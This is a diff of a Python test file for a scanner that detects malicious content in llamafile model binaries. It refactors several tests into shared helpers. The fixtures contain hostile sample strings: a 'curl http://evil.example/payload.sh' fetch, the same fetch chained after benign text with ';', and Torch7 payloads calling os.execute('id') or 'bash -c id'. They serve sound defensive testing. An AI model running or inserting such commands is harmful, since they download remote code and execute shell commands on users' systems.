@@ -48,6 +48,25 @@ from modelaudit.scanners.llamafile_scanner import (
 from tests.helpers import create_malicious_pickle
 
 
+def _record_torch7_candidate_offsets(monkeypatch: pytest.MonkeyPatch) -> list[int]:
+    """Record candidate offsets while delegating to the currently installed scanner."""
+    scanned_offsets: list[int] = []
+    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate
+
+    def counting_scan_candidate(
+        self: LlamafileScanner,
+        path: Path,
+        scanner: Any,
+        result: ScanResult,
+        offset: int,
+    ) -> tuple[ScanResult | None, int]:
+        scanned_offsets.append(offset)
+        return original_scan_candidate(self, path, scanner, result, offset)
+
+    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)
+    return scanned_offsets
+
+
 def _build_llamafile_blob(
     *,
     runtime_lines: list[str] | None = None,
@@ -108,16 +127,16 @@ def _build_mapped_executable_header(
     if executable_format == "pe":
         optional_header_size = 0xF0
         section_table_offset = 0x80 + 24 + optional_header_size
-        header = bytearray(section_table_offset + 40)
-        header[:2] = b"MZ"
-        struct.pack_into("<I", header, 0x3C, 0x80)
-        header[0x80:0x84] = b"PE\x00\x00"
-        struct.pack_into("<HHIIIHH", header, 0x84, 0x8664, 1, 0, 0, 0, optional_header_size, 0x2022)
-        struct.pack_into("<H", header, 0x98, 0x20B)
-        struct.pack_into("<I", header, 0x98 + 60, 512)
-        header[section_table_offset : section_table_offset + 8] = b".text\x00\x00\x00"
-        struct.pack_into("<II", header, section_table_offset + 16, mapped_size, 0)
-        return bytes(header)
+        pe_header = bytearray(section_table_offset + 40)
+        pe_header[:2] = b"MZ"
+        struct.pack_into("<I", pe_header, 0x3C, 0x80)
+        pe_header[0x80:0x84] = b"PE\x00\x00"
+        struct.pack_into("<HHIIIHH", pe_header, 0x84, 0x8664, 1, 0, 0, 0, optional_header_size, 0x2022)
+        struct.pack_into("<H", pe_header, 0x98, 0x20B)
+        struct.pack_into("<I", pe_header, 0x98 + 60, 512)
+        pe_header[section_table_offset : section_table_offset + 8] = b".text\x00\x00\x00"
+        struct.pack_into("<II", pe_header, section_table_offset + 16, mapped_size, 0)
+        return bytes(pe_header)
 
     if executable_format == "mach-o":
         header = b"\xcf\xfa\xed\xfe" + struct.pack("<iiIIIII", 0x01000007, 3, 2, 1, 72, 0, 0)
@@ -1565,20 +1584,7 @@ def test_llamafile_bounds_torch7_scan_attempts_after_marker_decoys(
     torch7_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('id')\n"
     binary.write_bytes(_build_llamafile_blob(embedded_payload=valid_gguf + decoys + torch7_payload))
 
-    scanned_offsets: list[int] = []
-    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate
-
-    def counting_scan_candidate(
-        self: LlamafileScanner,
-        path: Path,
-        scanner: Any,
-        result: ScanResult,
-        offset: int,
-    ) -> tuple[ScanResult | None, int]:
-        scanned_offsets.append(offset)
-        return original_scan_candidate(self, path, scanner, result, offset)
-
-    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)
+    scanned_offsets = _record_torch7_candidate_offsets(monkeypatch)
 
     result = LlamafileScanner(config={"torch7_max_scan_bytes": 128}).scan(str(binary))
 
@@ -1772,20 +1778,7 @@ def test_llamafile_bounds_actionable_candidate_scans_but_keeps_higher_severity(
     critical_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('bash -c id')\n"
     binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(warning_candidates) + critical_payload))
 
-    scanned_offsets: list[int] = []
-    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate
-
-    def counting_scan_candidate(
-        self: LlamafileScanner,
-        path: Path,
-        scanner: Any,
-        result: ScanResult,
-        offset: int,
-    ) -> tuple[ScanResult | None, int]:
-        scanned_offsets.append(offset)
-        return original_scan_candidate(self, path, scanner, result, offset)
-
-    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)
+    scanned_offsets = _record_torch7_candidate_offsets(monkeypatch)
 
     result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 128}).scan(
         str(binary)
@@ -1853,20 +1846,7 @@ def test_llamafile_does_not_rank_unrelated_shell_string_as_critical_cap_signal(
     critical_payload = b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('bash -c id')\n"
     binary.write_bytes(_build_llamafile_blob(embedded_payload=b"".join(warning_candidates) + critical_payload))
 
-    scanned_offsets: list[int] = []
-    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate
-
-    def counting_scan_candidate(
-        self: LlamafileScanner,
-        path: Path,
-        scanner: Any,
-        result: ScanResult,
-        offset: int,
-    ) -> tuple[ScanResult | None, int]:
-        scanned_offsets.append(offset)
-        return original_scan_candidate(self, path, scanner, result, offset)
-
-    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)
+    scanned_offsets = _record_torch7_candidate_offsets(monkeypatch)
 
     result = LlamafileScanner(config={"llamafile_torch7_max_candidate_scans": 2, "torch7_max_scan_bytes": 512}).scan(
         str(binary)
@@ -2073,27 +2053,15 @@ def test_llamafile_ignores_many_invalid_ascii_torch7_header_decoys(
     torch7_payload = b"4\n1\n3\nV 1\n13\nnn.Sequential\ncmd = os.execute('id')\n"
     binary.write_bytes(_build_llamafile_blob(embedded_payload=invalid_ascii_decoys + torch7_payload))
 
-    scanned_offsets: list[int] = []
     structural_probes = 0
-    original_scan_candidate = LlamafileScanner._scan_embedded_torch7_candidate
     original_structural_probe = find_structural_torch7_offset
-
-    def counting_scan_candidate(
-        self: LlamafileScanner,
-        path: Path,
-        scanner: Any,
-        result: ScanResult,
-        offset: int,
-    ) -> tuple[ScanResult | None, int]:
-        scanned_offsets.append(offset)
-        return original_scan_candidate(self, path, scanner, result, offset)
 
     def counting_structural_probe(payload: bytes) -> int | None:
         nonlocal structural_probes
         structural_probes += 1
         return original_structural_probe(payload)
 
-    monkeypatch.setattr(LlamafileScanner, "_scan_embedded_torch7_candidate", counting_scan_candidate)
+    scanned_offsets = _record_torch7_candidate_offsets(monkeypatch)
     monkeypatch.setattr(
         "modelaudit.scanners.llamafile_scanner.find_structural_torch7_offset", counting_structural_probe
     )
@@ -2778,20 +2746,7 @@ def test_llamafile_middle_window_failure_retains_marker_probe_findings(
 
 
 def test_llamafile_scanner_flags_suspicious_runtime_strings(tmp_path: Path) -> None:
-    binary = tmp_path / "suspicious.llamafile"
-    binary.write_bytes(
-        _build_llamafile_blob(
-            runtime_lines=[
-                "bash -c curl http://evil.example/payload.sh",
-            ]
-        )
-    )
-
-    result = LlamafileScanner().scan(str(binary))
-
-    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
-    assert runtime_issues
-    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+    _assert_llamafile_runtime_risk(tmp_path, ("suspicious.llamafile"), ("bash -c curl http://evil.example/payload.sh"))
 
 
 @pytest.mark.parametrize("encoding", ["utf-16le", "utf-16be"])
@@ -3461,20 +3416,7 @@ def test_llamafile_scanner_evidence_prefers_correlated_command_over_local_url(tm
 
 
 def test_llamafile_scanner_does_not_skip_mixed_safe_and_suspicious_runtime_string(tmp_path: Path) -> None:
-    binary = tmp_path / "mixed.llamafile"
-    binary.write_bytes(
-        _build_llamafile_blob(
-            runtime_lines=[
-                "llamafile ; curl http://evil.example/payload.sh",
-            ]
-        )
-    )
-
-    result = LlamafileScanner().scan(str(binary))
-
-    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
-    assert runtime_issues
-    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+    _assert_llamafile_runtime_risk(tmp_path, ("mixed.llamafile"), ("llamafile ; curl http://evil.example/payload.sh"))
 
 
 def test_llamafile_scanner_allows_known_safe_runtime_fragments(tmp_path: Path) -> None:
@@ -3528,20 +3470,11 @@ def test_llamafile_scanner_ignores_bundled_runtime_command_near_matches(
 
 
 def test_llamafile_scanner_flags_mixed_safe_fragment_and_command_tokens(tmp_path: Path) -> None:
-    binary = tmp_path / "mixed-fragment.llamafile"
-    binary.write_bytes(
-        _build_llamafile_blob(
-            runtime_lines=[
-                "INFO llama server listening on http://127.0.0.1:8080 ; curl http://evil.example/payload.sh",
-            ]
-        )
+    _assert_llamafile_runtime_risk(
+        tmp_path,
+        ("mixed-fragment.llamafile"),
+        ("INFO llama server listening on http://127.0.0.1:8080 ; curl http://evil.example/payload.sh"),
     )
-
-    result = LlamafileScanner().scan(str(binary))
-
-    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
-    assert runtime_issues
-    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
 
 
 @pytest.mark.parametrize(
@@ -3655,3 +3588,20 @@ def test_llamafile_embedded_gguf_findings_include_location_mapping(tmp_path: Pat
     embedded_checks = [check for check in result.checks if check.name.startswith("Llamafile Embedded")]
     assert embedded_checks
     assert any((check.location or "").startswith("llamafile:") for check in embedded_checks)
+
+
+def _assert_llamafile_runtime_risk(tmp_path: Path, filename: str, runtime_line: str) -> None:
+    binary = tmp_path / filename
+    binary.write_bytes(
+        _build_llamafile_blob(
+            runtime_lines=[
+                runtime_line,
+            ]
+        )
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert runtime_issues
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
